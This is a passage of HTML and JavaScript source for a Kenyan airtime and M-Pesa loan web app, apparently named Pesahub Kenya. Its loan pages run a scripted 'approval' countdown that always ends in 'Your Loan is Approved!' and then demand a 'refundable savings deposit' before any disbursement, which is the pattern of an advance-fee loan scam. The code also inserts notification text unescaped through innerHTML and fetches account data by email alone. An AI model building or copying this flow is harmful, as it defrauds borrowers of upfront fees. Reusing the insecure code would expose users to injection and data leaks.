                <div style="background: linear-gradient(135deg, var(--primary), var(--primary-dark)); color: white; padding: 20px; text-align: center;">
                    <i class="fas fa-clipboard-check" style="font-size: 2.5rem; margin-bottom: 10px;"></i>
                    <h2 style="font-size: 1.5rem; margin-bottom: 5px;">Review Your Application</h2>
                    <p style="opacity: 0.9; font-size: 0.9rem;">Please verify all information before proceeding</p>
                </div>
                <div class="page-content" style="padding-top: 20px;">
                    <div class="card" style="margin-bottom: 15px;">
                        <h3 class="card-title"><i class="fas fa-user"></i> Personal Information</h3>
                        <div id="reviewPersonalInfo" style="display: grid; gap: 10px;"></div>
                        <button class="btn btn-outline" style="margin-top: 15px;" onclick="editLoanSection('personal')"><i class="fas fa-edit"></i> Edit</button>
                    </div>

                    <div class="card" style="margin-bottom: 15px;">
                        <h3 class="card-title"><i class="fas fa-users"></i> Emergency Contacts</h3>
                        <div id="reviewEmergencyContacts" style="display: grid; gap: 10px;"></div>
                        <button class="btn btn-outline" style="margin-top: 15px;" onclick="editLoanSection('emergency')"><i class="fas fa-edit"></i> Edit</button>
                    </div>

                    <div class="card" style="margin-bottom: 15px;">
                        <h3 class="card-title"><i class="fas fa-briefcase"></i> Employment Information</h3>
                        <div id="reviewEmploymentInfo" style="display: grid; gap: 10px;"></div>
                        <button class="btn btn-outline" style="margin-top: 15px;" onclick="editLoanSection('employment')"><i class="fas fa-edit"></i> Edit</button>
                    </div>

                    <div class="card" style="margin-bottom: 15px;">
                        <h3 class="card-title"><i class="fas fa-hand-holding-usd"></i> Selected Loan Offer</h3>
                        <div id="reviewLoanOffer" style="display: grid; gap: 10px;"></div>
                        <button class="btn btn-outline" style="margin-top: 15px;" onclick="showPage('loan-offers')"><i class="fas fa-exchange-alt"></i> Change Offer</button>
                    </div>

                    <div class="card" style="margin-bottom: 20px;">
                        <h3 class="card-title"><i class="fas fa-mobile-alt"></i> Receiving Phone Number(â—ï¸SAFARICOM ONLY)</h3>
                        <div class="form-group" style="margin-bottom: 0;">
                            <div class="phone-wrapper">
                                <span class="phone-prefix">+254</span>
                                <input type="tel" class="form-input" id="reviewReceivingPhone" maxlength="9" oninput="validateReviewPhone(this)">
                            </div>
                            <p class="loan-error" id="reviewPhoneError" style="display: none; color: var(--danger); font-size: 0.8rem; margin-top: 5px;">Enter a valid Safaricom number (07 or 01)</p>
                        </div>
                    </div>

                    <div class="btn-group">
                        <button class="btn btn-primary" id="submitLoanReviewBtn" onclick="submitLoanReview()">
                            <i class="fas fa-check-double"></i> Submit & Get Loan
                        </button>
                        <button class="btn btn-outline" onclick="showPage('loan-offers')">
                            <i class="fas fa-arrow-left"></i> Back to Offers
                        </button>
                    </div>
                </div>
            </div>

            <!-- Loan Approval Processing Page -->
            <div id="page-loan-approval-processing" class="page">
                <div style="min-height: calc(100vh - 70px); display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 40px 20px; text-align: center; background: linear-gradient(180deg, var(--light) 0%, #e8f5e9 100%);">
                    <!-- Animated Processing Icon -->
                    <div style="position: relative; width: 120px; height: 120px; margin-bottom: 30px;">
                        <div style="width: 120px; height: 120px; border: 5px solid rgba(39, 174, 96, 0.2); border-top-color: var(--success); border-radius: 50%; animation: spin 1s linear infinite;"></div>
                        <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);">
                            <i class="fas fa-file-signature" style="font-size: 2.5rem; color: var(--success); animation: pulse 1.5s ease-in-out infinite;"></i>
                        </div>
                    </div>
                    
                    <h2 style="font-size: 1.6rem; color: var(--primary); margin-bottom: 10px; font-weight: 700;">Approving Your Loan</h2>
                    <p style="color: var(--gray); margin-bottom: 15px; font-size: 1rem;">Finalizing with lender...</p>
                    <p style="color: var(--danger); font-size: 0.9rem; margin-bottom: 25px;"><i class="fas fa-exclamation-triangle" style="margin-right: 5px;"></i> Please do not close this page</p>
                    
                    <!-- System Status Card -->
                    <div style="width: 100%; max-width: 400px; background: var(--white); border-radius: 16px; padding: 25px; margin-bottom: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.1);">
                        <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 20px; padding-bottom: 15px; border-bottom: 1px solid var(--border);">
                            <span class="live-indicator" style="background: var(--success);"></span>
                            <span style="font-size: 0.85rem; color: var(--success); font-weight: 600;">APPROVAL IN PROGRESS</span>
                        </div>
                        <div id="loanApprovalSteps">
                            <div class="approval-step" style="display: flex; align-items: center; gap: 12px; margin-bottom: 18px; padding: 10px; background: rgba(39, 174, 96, 0.1); border-radius: 10px;">
                                <i class="fas fa-check-circle" style="color: var(--success); font-size: 1.3rem;"></i>
                                <span style="font-size: 0.95rem; font-weight: 500;">Application received</span>
                            </div>
                            <div class="approval-step" style="display: flex; align-items: center; gap: 12px; margin-bottom: 18px; padding: 10px; background: rgba(26, 95, 42, 0.1); border-radius: 10px;">
                                <i class="fas fa-spinner fa-spin" style="color: var(--primary); font-size: 1.3rem;"></i>
                                <span style="font-size: 0.95rem; font-weight: 500;">Final verification in progress...</span>
                            </div>
                            <div class="approval-step" style="display: flex; align-items: center; gap: 12px; margin-bottom: 18px; padding: 10px; border-radius: 10px; opacity: 0.5;">
                                <i class="fas fa-circle" style="color: var(--gray); font-size: 1.3rem;"></i>
                                <span style="font-size: 0.95rem;">Confirming with lender...</span>
                            </div>
                            <div class="approval-step" style="display: flex; align-items: center; gap: 12px; padding: 10px; border-radius: 10px; opacity: 0.5;">
                                <i class="fas fa-circle" style="color: var(--gray); font-size: 1.3rem;"></i>
                                <span style="font-size: 0.95rem;">Preparing disbursement...</span>
                            </div>
                        </div>
                    </div>

                    <!-- Timer Badge -->
                    <div style="background: linear-gradient(135deg, var(--success), #2ecc71); color: white; padding: 18px 40px; border-radius: 50px; font-size: 1.3rem; font-weight: 700; box-shadow: 0 8px 25px rgba(39, 174, 96, 0.4);">
                        <i class="fas fa-hourglass-half" style="margin-right: 10px; animation: pulse 1s ease-in-out infinite;"></i>
                        <span id="loanApprovalTimer">30</span> seconds
                    </div>
                    
                    <div style="margin-top: 25px; padding: 15px 20px; background: rgba(39, 174, 96, 0.1); border-radius: 12px;">
                        <p style="font-size: 0.9rem; color: var(--primary);"><i class="fas fa-shield-alt" style="margin-right: 8px;"></i> Secure connection to lender network</p>
                    </div>
                </div>
            </div>

            <!-- Loan Approved Page -->
            <div id="page-loan-approved" class="page">
                <div style="background: linear-gradient(135deg, var(--success), #27ae60); color: white; padding: 40px 20px; text-align: center; position: relative; overflow: hidden;">
                    <img src="approved.png" alt="" style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; width: 100%; height: 100%; object-fit: cover; opacity: 0.15;" onerror="this.style.display='none'">
                    <div style="position: relative; z-index: 1;">
                        <div style="width: 100px; height: 100px; background: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.2);">
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52" style="width: 60px; height: 60px;">
                                <circle cx="26" cy="26" r="25" fill="none" stroke="#27ae60" stroke-width="2"/>
                                <path fill="none" stroke="#27ae60" stroke-width="4" stroke-linecap="round" stroke-linejoin="round" d="M14.1 27.2l7.1 7.2 16.7-16.8" style="animation: checkmark 0.8s ease-in-out forwards;"/>
                                <style>
                                    @keyframes checkmark { 0% { stroke-dasharray: 0 100; } 100% { stroke-dasharray: 100 100; } }
                                </style>
                            </svg>
                        </div>
                        <h2 style="font-size: 1.8rem; margin-bottom: 10px; font-weight: 700;">Your Loan is Approved!</h2>
                        <p style="opacity: 0.95; font-size: 1.2rem;">KES <span id="approvedLoanAmount">-</span> approved successfully Awaiting disbursement</p>
                    </div>
                </div>

                <div class="page-content" style="padding-top: 20px;">
                    <div class="card" style="margin-bottom: 20px; background: linear-gradient(135deg, rgba(241, 196, 15, 0.1), rgba(243, 156, 18, 0.05)); border: 2px solid var(--warning);">
                        <h3 class="card-title" style="color: var(--warning);"><i class="fas fa-exclamation-triangle"></i> Important: Complete Your Savings Deposit</h3>
                        <p style="font-size: 0.9rem; color: var(--dark); line-height: 1.6; margin-bottom: 15px;">
                            To receive your loan, you need to deposit your savings amount first. This is a <strong>refundable deposit</strong> that serves as collateral and will be returned after successful loan repayment.
                        </p>
                        <p style="font-size: 0.85rem; color: var(--gray);">
                            <i class="fas fa-info-circle"></i> Your loan will be disbursed immediately after your savings deposit is confirmed by the lender.
                        </p>
                    </div>

                    <div class="card" style="margin-bottom: 20px;">
                        <h3 class="card-title"><i class="fas fa-file-invoice-dollar"></i> Loan Details</h3>
                        <div style="display: grid; gap: 15px;">
                            <div style="display: flex; justify-content: space-between; padding: 12px; background: var(--light); border-radius: 8px;">
                                <span style="color: var(--gray);">Savings Amount (Fee)</span>
                                <span style="font-weight: 700; color: var(--warning);" id="approvedSavingsAmount">KES -</span>
                            </div>
                            <div style="display: flex; justify-content: space-between; padding: 12px; background: var(--light); border-radius: 8px;">
                                <span style="color: var(--gray);">Loan Released</span>
                                <span style="font-weight: 600;" id="approvedReleaseNote">deposited to your mpesa provided number Immediately after savings deposit</span>
                            </div>
                            <div style="display: flex; justify-content: space-between; padding: 12px; background: var(--light); border-radius: 8px;">
                                <span style="color: var(--gray);">Phone Number</span>
                                <span style="font-weight: 600;" id="approvedPhoneNumber">-</span>
                            </div>
                            <div style="display: flex; justify-content: space-between; padding: 12px; background: var(--light); border-radius: 8px;">
                                <span style="color: var(--gray);">Email</span>
                                <span style="font-weight: 600;" id="approvedEmailHidden">â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢@â€¢â€¢â€¢.com</span>
                            </div>
                        </div>
                    </div>

                    <button class="btn btn-primary" id="savingsDepositBtn" onclick="initiateSavingsDeposit()" style="font-size: 1.1rem; padding: 18px; background: linear-gradient(135deg, #f39c12, #e67e22); border: none;">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white" style="width: 24px; height: 24px; margin-right: 10px; vertical-align: middle;">
                            <path d="M19.5 5.5c-.83 0-1.5.67-1.5 1.5v.17c-2.09-.59-3.73-2.19-4.5-4.17h-3c-.77 1.98-2.41 3.58-4.5 4.17V7c0-.83-.67-1.5-1.5-1.5S3 6.17 3 7v5c0 4.08 2.55 7.58 6.15 9h5.7C18.45 19.58 21 16.08 21 12V7c0-.83-.67-1.5-1.5-1.5zM12 18c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/>
                            <circle cx="12" cy="13" r="2.5"/>
                        </svg>
                        Save KES <span id="savingsBtnAmount">-</span> to Get Loan Now
                    </button>

                    <div id="savingsDepositStatus" style="display: none; margin-top: 20px; text-align: center;">
                        <div style="display: flex; align-items: center; justify-content: center; gap: 10px;">
                            <span class="live-indicator"></span>
                            <span id="savingsStatusText">Initiating savings deposit...</span>
                        </div>
                    </div>

                    <button class="btn btn-outline" style="margin-top: 15px;" onclick="showPage('loan-offers'); populateLoanOfferDetails();">
                        <i class="fas fa-exchange-alt"></i> Change Loan Offer
                    </button>

                    <div style="margin-top: 20px; padding: 15px; background: var(--light); border-radius: 12px; text-align: center;">
                        <p style="font-size: 0.85rem; color: var(--gray);"><i class="fas fa-shield-alt"></i> Your savings deposit is secure and will be added to your permanent balance.</p>
                    </div>
                </div>
            </div>
        </main>

        <div class="notification-panel" id="notificationPanel">
            <div class="notification-header">
                <h4><i class="fas fa-bell"></i> Notifications</h4>
                <button onclick="toggleNotifications()" style="background: none; border: none; cursor: pointer;">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="notification-list" id="notificationList">
                <div class="empty-state" style="padding: 30px;">
                    <i class="fas fa-bell-slash"></i>
                    <p>No notifications yet</p>
                </div>
            </div>
        </div>

        <div class="modal" id="insufficientModal">
            <div class="modal-content">
                <div class="modal-header">
                    <h3><i class="fas fa-exclamation-triangle" style="color: var(--warning);"></i> Insufficient Balance</h3>
                    <button class="modal-close" onclick="closeModal('insufficientModal')">&times;</button>
                </div>
                <div class="modal-body">
                    <p style="margin-bottom: 15px;">You need <strong>KES <span id="insufficientShortfall">0</span></strong> more to complete this purchase.</p>
                    <div class="form-group">
                        <label class="form-label"><i class="fas fa-phone"></i> Phone Number</label>
                        <div class="phone-wrapper">
                            <span class="phone-prefix">+254</span>
                            <input type="tel" class="form-input" id="modalDepositPhone" maxlength="9">
                        </div>
                    </div>
                    <div class="form-group">
                        <label class="form-label"><i class="fas fa-money-bill"></i> Amount to Deposit</label>
                        <input type="number" class="form-input" id="modalDepositAmount" min="10">
                    </div>
                    <div class="btn-group">
                        <button class="btn btn-primary" onclick="depositFromModal()">
                            <i class="fas fa-mobile-alt"></i> Deposit via M-Pesa STK
                        </button>
                        <button class="btn btn-link" onclick="depositFromModalLink()">
                            <i class="fas fa-link"></i> Deposit with Payment Link
                        </button>
                    </div>
                </div>
            </div>
        </div>

        <div class="modal" id="authModal">
            <div class="modal-content">
                <div class="modal-header">
                    <h3><i class="fas fa-lock"></i> Login Required</h3>
                    <button class="modal-close" onclick="closeModal('authModal')">&times;</button>
                </div>
                <div class="modal-body">
                    <p style="margin-bottom: 20px;">Please login / create an account or use the USE WITHOUT ACCOUNT button below to buy airtime directly no account needed.</p>
                    <div class="btn-group">
                        <a href="login.html" class="btn btn-primary"><i class="fas fa-sign-in-alt"></i> Login</a>
                        <a href="login.html" class="btn btn-outline"><i class="fas fa-user-plus"></i> Sign Up</a>
                    </div>
                    <div class="divider-text"><span>OR</span></div>
                    <button class="btn btn-secondary" onclick="closeModal('authModal'); scrollToDirectBuy();" style="margin-top: 10px;">
                        <i class="fas fa-bolt"></i> Use Without Account  to buy airtime directly
                    </button>
                </div>
            </div>
        </div>

        <div class="modal" id="directBuyReceiptModal">
            <div class="modal-content">
                <div class="modal-header">
                    <h3><i class="fas fa-receipt"></i> Transaction Receipt</h3>
                    <button class="modal-close" onclick="closeModal('directBuyReceiptModal')">&times;</button>
                </div>
                <div class="modal-body">
                    <div id="receiptContent" style="text-align: center;">
                        <div id="receiptIcon" style="font-size: 4rem; margin-bottom: 20px;"></div>
                        <h4 id="receiptStatus" style="font-size: 1.3rem; margin-bottom: 15px;"></h4>
                        <div style="background: var(--light); border-radius: 12px; padding: 20px; margin: 20px 0;">
                            <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
                                <span style="color: var(--gray);">Phone:</span>
                                <span id="receiptPhone" style="font-weight: 600;"></span>
                            </div>
                            <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
                                <span style="color: var(--gray);">Amount:</span>
                                <span id="receiptAmount" style="font-weight: 600;"></span>
                            </div>
                            <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
                                <span style="color: var(--gray);">Network:</span>
                                <span id="receiptNetwork" style="font-weight: 600;"></span>
                            </div>
                            <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
                                <span style="color: var(--gray);">Transaction ID:</span>
                                <span id="receiptTxId" style="font-weight: 600; font-size: 0.85rem;"></span>
                            </div>
                            <div style="display: flex; justify-content: space-between;">
                                <span style="color: var(--gray);">Date:</span>
                                <span id="receiptDate" style="font-weight: 600;"></span>
                            </div>
                        </div>
                        <p id="receiptMessage" style="color: var(--gray); font-size: 0.9rem;"></p>
                    </div>
                    <button class="btn btn-primary" onclick="closeModal('directBuyReceiptModal')" style="margin-top: 15px;">
                        <i class="fas fa-check"></i> Done
                    </button>
                </div>
            </div>
        </div>

        <!-- Loan Terms Modal -->
        <div class="modal" id="loanTermsModal">
            <div class="modal-content" style="max-height: 90vh; display: flex; flex-direction: column;">
                <div class="modal-header">
                    <h3><i class="fas fa-file-contract" style="color: var(--primary);"></i> Loan Terms & Conditions</h3>
                    <button class="modal-close" onclick="closeModal('loanTermsModal')">&times;</button>
                </div>
                <div class="modal-body" style="flex: 1; overflow: hidden; display: flex; flex-direction: column;">
                    <div id="loanTermsContent" style="flex: 1; overflow-y: auto; padding: 15px; background: var(--light); border-radius: 12px; max-height: 400px;" onscroll="checkTermsScroll()">
                        <h4 style="color: var(--primary); margin-bottom: 15px;">Loan Service Agreement</h4>
                        
                        <p style="margin-bottom: 15px; line-height: 1.7;">By applying for a loan through Pesahub Kenya, you agree to the following terms and conditions:</p>
                        
                        <h5 style="margin: 20px 0 10px; color: var(--dark);">1. Eligibility Requirements</h5>
                        <ul style="margin-left: 20px; color: var(--gray); line-height: 1.8;">
                            <li>You must be at least 18 years of age</li>
                            <li>You must be a Kenyan citizen with a valid National ID</li>
                            <li>You must have an active M-Pesa registered phone number</li>
                            <li>You must have a source of regular income</li>
                        </ul>
                        
                        <h5 style="margin: 20px 0 10px; color: var(--dark);">2. Loan Terms</h5>
                        <ul style="margin-left: 20px; color: var(--gray); line-height: 1.8;">
                            <li>Loan amounts range from KES 4,000 to KES 15,000 for first-time borrowers</li>
                            <li>Interest rates range from 1.5% to 2.1% depending on the lender</li>
                            <li>Loan repayment periods range from 60 to 100 days</li>
                            <li>Late payment penalties may apply</li>
                        </ul>
                        
                        <h5 style="margin: 20px 0 10px; color: var(--dark);">3. Savings Deposit (Security Fee)</h5>
                        <ul style="margin-left: 20px; color: var(--gray); line-height: 1.8;">
                            <li>A refundable savings deposit is required before loan disbursement</li>
                            <li>This deposit serves as collateral and is held in your permanent savings balance</li>
                            <li>The savings deposit will be returned upon successful loan repayment</li>
                            <li>Savings deposits cannot be used for airtime purchases</li>
                        </ul>
                        
                        <h5 style="margin: 20px 0 10px; color: var(--dark);">4. Loan Disbursement</h5>
                        <ul style="margin-left: 20px; color: var(--gray); line-height: 1.8;">
                            <li>Loans are disbursed directly to your M-Pesa account</li>
                            <li>Disbursement occurs within minutes after savings deposit confirmation</li>
                            <li>A processing fee may be deducted from the loan amount</li>
                        </ul>
                        
                        <h5 style="margin: 20px 0 10px; color: var(--dark);">5. Data Privacy & Consent</h5>
                        <ul style="margin-left: 20px; color: var(--gray); line-height: 1.8;">
                            <li>You consent to the collection and processing of your personal data</li>
                            <li>Your information may be shared with partner lending institutions</li>
                            <li>We may contact you and your emergency contacts regarding loan matters</li>
                            <li>Your data is protected according to Kenyan data protection laws</li>
                        </ul>
                        
                        <h5 style="margin: 20px 0 10px; color: var(--dark);">6. Default & Collections</h5>
                        <ul style="margin-left: 20px; color: var(--gray); line-height: 1.8;">
                            <li>Failure to repay may result in negative credit reporting</li>
                            <li>Collection activities may be initiated for overdue payments</li>
                            <li>Your savings deposit may be forfeited in case of default</li>
                        </ul>
                        
                        <h5 style="margin: 20px 0 10px; color: var(--dark);">7. Agreement</h5>
                        <p style="color: var(--gray); line-height: 1.8; margin-bottom: 20px;">
                            By proceeding with the loan application, you acknowledge that you have read, understood, and agree to be bound by these terms and conditions. You confirm that all information provided is accurate and complete.
                        </p>
                        
                        <div style="text-align: center; padding: 20px; background: var(--success); color: white; border-radius: 12px;">
                            <i class="fas fa-check-circle" style="font-size: 2rem; margin-bottom: 10px;"></i>
                            <p style="font-weight: 600;">End of Terms & Conditions</p>
                            <p style="font-size: 0.85rem; opacity: 0.9;">Scroll down to enable the Accept button</p>
                        </div>
                    </div>
                    
                    <div style="margin-top: 15px;">
                        <button class="btn btn-primary" id="acceptTermsBtn" onclick="acceptLoanTerms()" disabled style="opacity: 0.5;">
                            <i class="fas fa-check"></i> I Accept the Terms & Conditions
                        </button>
                        <button class="btn btn-outline" onclick="closeModal('loanTermsModal')" style="margin-top: 10px;">
                            <i class="fas fa-times"></i> Cancel
                        </button>
                    </div>
                </div>
            </div>
        </div>

        <!-- Loan Offer Selection Popup -->
        <div class="modal" id="loanOfferPopup">
            <div class="modal-content">
                <div class="modal-header">
                    <h3><i class="fas fa-check-circle" style="color: var(--success);"></i> Confirm Selection</h3>
                    <button class="modal-close" onclick="closeModal('loanOfferPopup')">&times;</button>
                </div>
                <div class="modal-body">
                    <div style="text-align: center; margin-bottom: 20px;">
                        <img src="company-logo.png" id="popupLenderLogo" alt="Lender" style="width: 80px; height: 80px; border-radius: 16px; object-fit: cover; margin: 0 auto 15px; border: 3px solid var(--success); display: block;" onerror="this.outerHTML='<div style=\\'width: 80px; height: 80px; background: linear-gradient(135deg, var(--success), #2ecc71); border-radius: 16px; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;\\'><i class=\\'fas fa-hand-holding-usd\\' style=\\'font-size: 2rem; color: white;\\'></i></div>'">
                        <h4 style="color: var(--primary); margin-bottom: 5px; font-size: 1.2rem;" id="popupLenderName">-</h4>
                        <p style="color: var(--gray);">Loan Offer</p>
                    </div>
                    
                    <div style="background: var(--light); border-radius: 12px; padding: 15px; margin-bottom: 20px;">
                        <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
                            <span style="color: var(--gray);">Loan Amount</span>
                            <span style="font-weight: 700; color: var(--success);" id="popupLoanAmount">-</span>
                        </div>
                        <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
                            <span style="color: var(--gray);">Savings Required</span>
                            <span style="font-weight: 600; color: var(--warning);" id="popupSavings">-</span>
                        </div>
                        <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
                            <span style="color: var(--gray);">You Receive</span>
                            <span style="font-weight: 600;" id="popupReceive">-</span>
                        </div>
                        <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
                            <span style="color: var(--gray);">Repayment</span>
                            <span style="font-weight: 600;" id="popupRepayment">-</span>
                        </div>
                        <div style="display: flex; justify-content: space-between;">
                            <span style="color: var(--gray);">Duration</span>
                            <span style="font-weight: 600;" id="popupDuration">-</span>
                        </div>
                    </div>
                    
                    <div class="btn-group">
                        <button class="btn btn-primary" onclick="confirmLoanSelection()">
                            <i class="fas fa-arrow-right"></i> Proceed to Review
                        </button>
                        <button class="btn btn-outline" onclick="closeModal('loanOfferPopup')">
                            <i class="fas fa-times"></i> Cancel
                        </button>
                    </div>
                </div>
            </div>
        </div>

        <div class="toast" id="toast">
            <i class="fas fa-info-circle"></i>
            <span id="toastMessage">Message</span>
        </div>

        <div class="modal" id="loanResumeModal">
            <div class="modal-content" style="max-width: 400px;">
                <div class="modal-header" style="background: linear-gradient(135deg, #27ae60, #2ecc71); color: white; border-radius: 12px 12px 0 0; padding: 20px;">
                    <h3 style="display: flex; align-items: center; gap: 10px;"><i class="fas fa-info-circle"></i> Loan Application Notice</h3>
                    <button class="modal-close" onclick="closeModal('loanResumeModal')" style="color: white;">&times;</button>
                </div>
                <div class="modal-body" style="padding: 25px;">
                    <p style="margin-bottom: 15px; color: var(--dark); font-size: 0.95rem;">You have an existing loan application in progress.</p>
                    
                    <div style="background: var(--light); border-radius: 12px; padding: 15px; margin-bottom: 20px;">
                        <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
                            <span style="color: var(--gray);">Status</span>
                            <span style="font-weight: 600; color: var(--success);" id="resumeStatus">-</span>
                        </div>
                        <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
                            <span style="color: var(--gray);">Name</span>
                            <span style="font-weight: 600;" id="resumeName">-</span>
                        </div>
                        <div style="display: flex; justify-content: space-between;" id="resumeOfferRow" style="display: none;">
                            <span style="color: var(--gray);">Selected Offer</span>
                            <span style="font-weight: 600; color: var(--primary);" id="resumeOffer">-</span>
                        </div>
                    </div>
                    
                    <div class="btn-group">
                        <button class="btn btn-primary" onclick="resumeLoanApplication()" style="background: linear-gradient(135deg, #27ae60, #2ecc71);">
                            <i class="fas fa-arrow-right"></i> Continue Application
                        </button>
                        <button class="btn btn-outline" onclick="startNewLoanApplication()" style="color: var(--danger); border-color: var(--danger);">
                            <i class="fas fa-redo"></i> Start New Application
                        </button>
                        <button class="btn btn-outline" onclick="closeModal('loanResumeModal')">
                            <i class="fas fa-times"></i> Close
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js';
        import { getAuth, onAuthStateChanged, signOut } from 'https://www.gstatic.com/firebasejs/9.22.2/firebase-auth.js';

        const firebaseConfig = {
            apiKey: "AIzaSyBtx-D3nbl1lKOhCzEixDZRgRDM4NbtOBE",
            authDomain: "swiftauth-5fcb5.firebaseapp.com",
            projectId: "swiftauth-5fcb5",
            storageBucket: "swiftauth-5fcb5.firebasestorage.app",
            messagingSenderId: "990160652137",
            appId: "1:990160652137:web:abac238567edfdb5671ff8",
            measurementId: "G-5C1DS28B5S"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);

        const API_BASE = 'https://airtimesolutionbackend2.onrender.com';

        let currentUser = null;
        let adminLoggedIn = false;
        let deferredPrompt = null;
        let balanceRefreshInterval = null;
        let depositRefreshInterval = null;
        let pendingPurchase = null;
        let currentDepositReference = null;

        function showLoading(text = 'Loading...') {
            document.getElementById('loadingText').textContent = text;
            document.getElementById('loadingOverlay').classList.add('show');
        }

        function hideLoading() {
            document.getElementById('loadingOverlay').classList.remove('show');
        }

        function showBalanceOverlay() {
            document.getElementById('balanceOverlay').classList.add('show');
        }

        function hideBalanceOverlay() {
            document.getElementById('balanceOverlay').classList.remove('show');
        }

        onAuthStateChanged(auth, async (user) => {
            const email = localStorage.getItem('userEmail');
            if (user && email) {
                await loadUserData(email);
            } else if (!email) {
                showAuthModal();
            }
        });

        async function loadUserData(email) {
            try {
                showLoading('Loading account data please wait....');
                const response = await fetch(`${API_BASE}/api/users/by-email/${encodeURIComponent(email)}`);
                const data = await response.json();
                if (data.success) {
                    currentUser = { ...data.user, email };
                    updateUI();
                    loadNotifications();
                    loadTransactions();
                    startAutoRefresh();
                    hideLoading();
                } else {
                    hideLoading();
                    showAuthModal();
                }
            } catch (error) {
                console.error('Failed to load user data:', error);
                hideLoading();
                const cached = localStorage.getItem('cachedBalance');
                if (cached) {
                    const data = JSON.parse(cached);
                    currentUser = { email, balance: data.balance, bonus_balance: data.bonus };
                    updateUI();
                }
            }
        }

        function updateUI() {
            if (currentUser) {
                const total = parseFloat(currentUser.balance || 0) + parseFloat(currentUser.bonus_balance || 0);
                document.getElementById('headerBalance').textContent = total.toFixed(2);
                document.getElementById('sidebarEmail').textContent = currentUser.email;
                document.getElementById('sidebarBalance').textContent = `KES ${total.toFixed(2)}`;
                document.getElementById('dashboardBalance').textContent = `KES ${total.toFixed(2)}`;
                document.getElementById('profileEmail').value = currentUser.email;
                document.getElementById('profilePhone').value = localStorage.getItem('userPhone')?.replace('254', '') || '';
            }
        }

        function startAutoRefresh() {
            if (balanceRefreshInterval) clearInterval(balanceRefreshInterval);
            balanceRefreshInterval = setInterval(() => {
                if (currentUser) {
                    silentRefreshBalance();
                }
            }, 30000);
        }

        function startDepositRefresh() {
            if (depositRefreshInterval) clearInterval(depositRefreshInterval);
            depositRefreshInterval = setInterval(() => {
                if (currentUser) {
                    silentRefreshBalance();
                    silentRefreshTransactions();
                }
            }, 2000);
        }

        function stopDepositRefresh() {
            if (depositRefreshInterval) {
                clearInterval(depositRefreshInterval);
                depositRefreshInterval = null;
            }
        }

        async function silentRefreshBalance() {
            if (!currentUser) return;
            try {
                const response = await fetch(`${API_BASE}/api/users/balance-by-email/${encodeURIComponent(currentUser.email)}`);
                const data = await response.json();
                if (data.success) {
                    currentUser.balance = data.balance;
                    currentUser.bonus_balance = data.bonus;
                    updateUI();
                    localStorage.setItem('cachedBalance', JSON.stringify({
                        balance: data.balance,
                        bonus: data.bonus,
                        total: data.total,
                        timestamp: Date.now()
                    }));
                }
            } catch (error) {
                console.error('Silent refresh error:', error);
            }
        }

        async function silentRefreshTransactions() {
            if (!currentUser) return;
            try {
                const response = await fetch(`${API_BASE}/api/transactions/${encodeURIComponent(currentUser.email)}`);
                const data = await response.json();
                if (data.success) {
                    renderTransactions(data.transactions);
                }
            } catch (error) {
                console.error('Silent transaction refresh error:', error);
            }
        }

        window.refreshBalance = async function() {
            if (!currentUser) return;
            const btn = document.getElementById('refreshBtn');
            btn.classList.add('spinning');
            try {
                const response = await fetch(`${API_BASE}/api/users/balance-by-email/${encodeURIComponent(currentUser.email)}`);
                const data = await response.json();
                if (data.success) {
                    currentUser.balance = data.balance;
                    currentUser.bonus_balance = data.bonus;
                    updateUI();
                    showToast('Balance refreshed successfully!', 'success');
                }
            } catch (error) {
                showToast('Failed to refresh balance', 'error');
            }
            btn.classList.remove('spinning');
        };

        async function loadNotifications() {
            if (!currentUser) return;
            try {
                const response = await fetch(`${API_BASE}/api/notifications/${encodeURIComponent(currentUser.email)}`);
                const data = await response.json();
                if (data.success) {
                    renderNotifications(data.notifications);
                }
            } catch (error) {
                console.error('Failed to load notifications:', error);
            }
        }

        function renderNotifications(notifications) {
            const list = document.getElementById('notificationList');
            const unreadCount = notifications.filter(n => !n.is_read).length;
            document.getElementById('notifBadge').textContent = unreadCount;
            const notifBtn = document.querySelector('.notification-btn');
            if (unreadCount > 0) {
                notifBtn.classList.add('has-notification');
            } else {
                notifBtn.classList.remove('has-notification');
            }
            if (notifications.length === 0) {
                list.innerHTML = '<div class="empty-state" style="padding: 30px;"><i class="fas fa-bell-slash"></i><p>No notifications yet</p></div>';
                return;
            }
            list.innerHTML = notifications.map(n => `
                <div class="notification-item ${!n.is_read ? 'unread' : ''}" onclick="markNotificationRead('${n.id}')">
                    <h5>${n.title}</h5>
                    <p>${n.message}</p>
                    <div class="time">${new Date(n.created_at).toLocaleString()}</div>
                </div>
            `).join('');
        }

        window.markNotificationRead = async function(id) {
            try {
                await fetch(`${API_BASE}/api/notifications/${id}/read`, { method: 'PUT' });
                loadNotifications();
            } catch (error) {
                console.error('Failed to mark as read:', error);
            }
        };

        async function loadTransactions() {
            if (!currentUser) return;
            try {
                const response = await fetch(`${API_BASE}/api/transactions/${encodeURIComponent(currentUser.email)}`);
                const data = await response.json();
                if (data.success) {
                    renderTransactions(data.transactions);
                }
            } catch (error) {
